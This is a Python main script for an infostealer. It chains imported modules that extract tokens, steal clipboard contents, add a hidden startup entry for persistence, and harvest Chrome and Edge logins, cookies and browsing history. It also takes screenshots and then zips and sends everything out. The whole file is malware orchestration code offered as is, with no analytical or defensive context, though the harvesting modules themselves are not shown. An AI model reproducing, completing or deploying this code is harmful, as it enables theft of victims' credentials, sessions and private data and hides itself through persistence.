import threading, sys, time
from components.wtoken import TokenExtractor
from components.screenshot import take_screenshot
from browsers.chromestealer import extract_logins_cookies_history
from browsers.edgestealer import edgethief
from components.zipandsend import zipnsend
from components.info import send_screenshot
from components.clipboard import steal_data
from components.startup import hiddenstartup
sys.dont_write_bytecode=True
token_extractor = TokenExtractor()
token_extractor.save_tokens()
threading.Thread(target=steal_data).start()
threading.Thread(target=hiddenstartup).start()
send_screenshot()
threading.Thread(target=extract_logins_cookies_history).start()
threading.Thread(target=edgethief).start()
take_screenshot()
time.sleep(2.2)
zipnsend()